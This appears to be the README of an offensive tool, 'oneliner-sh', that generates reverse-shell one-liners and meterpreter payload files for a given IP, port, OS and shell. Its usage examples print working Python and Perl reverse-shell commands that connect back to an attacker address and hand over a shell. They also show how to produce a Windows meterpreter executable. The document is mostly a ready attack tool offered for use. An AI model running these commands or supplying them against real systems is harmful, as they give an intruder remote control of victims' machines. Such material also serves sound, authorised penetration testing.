# oneliner-sh

### oneliner is a tool that gives a list of compatible reverse-shell-string oneliners.

````
Usage:
 	in_shell.sh [-i IP] [-p PORT] [-A PLATFORM] [-s SHELL_TYPE] [-d DELIM] [-qfr] 

 option : description - Default

 -i : The IP that the reverse shell will connect to. - 192.168.1.66 (an 'ip addr' IP except localhost)
 -p : The TCP port that the reverse shell will connect to. - 4444
 -A : [lin|win|mac] The OS that the reverse shell command will run on. - lin
 -s : [cmd.exe|/bin/sh| etc] The shell you are claiming. Quote for shell arguments (-s "/bin/bash -i") - /bin/sh
 -q : Quiet mode. Doesn't show the instructions, just the stuff (USE IT). - Disabled
 -f : Create standalone files at /tmp (meterpreter, python rev_shell, etc) - Disabled (makes the script slow)
 -d : [#|@| etc] Set 'cut' delimiter. It MUST be one char for use with UNIX cut - #
 -r : Makes the output Readable for humans - Disabled
 -h : This help message 
 

 Example :
 	in_shell.sh -i 192.168.1.2 -p 444 -A win -s cmd.exe -d# -q -f -r

 ==============================================================================
 Instructions
 Pipe this command with 'grep' and 'cut' to get reverse shell one-liners and payload file locations.
 Example:
 	To get a python reverse shell one-liner for linux /bin/sh shell type:

 $ in_shell.sh -i 192.168.1.2 -p 444 -A lin -s /bin/sh -q | grep python | cut -d# -f4
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh"]);'

 	To get a meterpreter reverse TCP executable for windows type (it is a file so enable -f):

 $ in_shell.sh -i 192.168.1.2 -p 444 -A win -q -f | grep meterpreter | cut -d# -f4
 /tmp/meterpreter

 	Defaults are also sane:

 $ in_shell.sh -A win | grep perl |cut -d# -f4
 perl -MIO::Socket -e '$c=new IO::Socket::INET(PeerAddr => "192.168.1.66:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

 
 ============================================================================== 
 		***Happy Hunting*** 
````
